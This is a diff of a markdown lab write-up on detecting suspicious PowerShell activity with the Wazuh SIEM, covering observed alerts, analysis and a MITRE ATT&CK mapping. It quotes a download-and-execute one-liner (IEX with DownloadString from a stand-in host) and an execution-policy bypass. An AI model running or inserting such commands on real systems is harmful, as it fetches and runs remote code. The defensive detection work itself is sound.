@@ -1,12 +1,12 @@
 ## LAB 006: Suspicious PowerShell Activity Detection (Wazuh)
 
----
+
 
 ### Overview
 
 This lab demonstrates detection and analysis of suspicious PowerShell activity using Wazuh SIEM. The objective was to simulate attacker behavior and investigate how system logs and alerts respond to potentially malicious commands.
 
----
+
 
 ### Environment
 
@@ -14,7 +14,7 @@ This lab demonstrates detection and analysis of suspicious PowerShell activity u
 - Wazuh SIEM Dashboard  
 - PowerShell (Administrator)  
 
----
+
 
 ### Attack Simulation
 
@@ -28,7 +28,7 @@ powershell -ExecutionPolicy Bypass -Command "Get-Process"
 
 powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
 
----
+
 
 ### Observations
 
@@ -43,7 +43,7 @@ Detected alerts included:
 - Multiple System Error Events (Rule 61110)  
 - Shell stopped unexpectedly (Rule 60778)  
 
----
+
 
 ### Analysis
 
@@ -61,14 +61,13 @@ The unexpected shell termination and system errors were likely caused by the fai
 
 This demonstrates that even unsuccessful attack attempts can generate detectable signals.
 
----
+
 
 ### MITRE ATTACK Mapping
 
 - T1059.001 - PowerShell  
 - T1105 - Ingress Tool Transfer  
 
----
 
 ### Conclusion
 
@@ -78,17 +77,17 @@ While no payload was successfully executed, the techniques used closely mirror r
 
 Wazuh successfully detected abnormal system behavior and generated alerts, confirming its effectiveness in identifying suspicious PowerShell activity.
 
----
 
 ### Screenshots
 
-(Add your screenshots to this folder and rename them if needed)
+#### 1. Suspicious PowerShell Command
+![PowerShell Command](01-powershell-command.png)
 
-PowerShell Command  
-Error Output  
-Wazuh Alerts  
+#### 2. Wazuh Alerts
+![Wazuh Alerts](02-wazuh-alerts.png)
 
----
+#### 3. Shell Error Output
+![Shell Error](03-shell-error.png)
 
 ### Key Takeaway
 
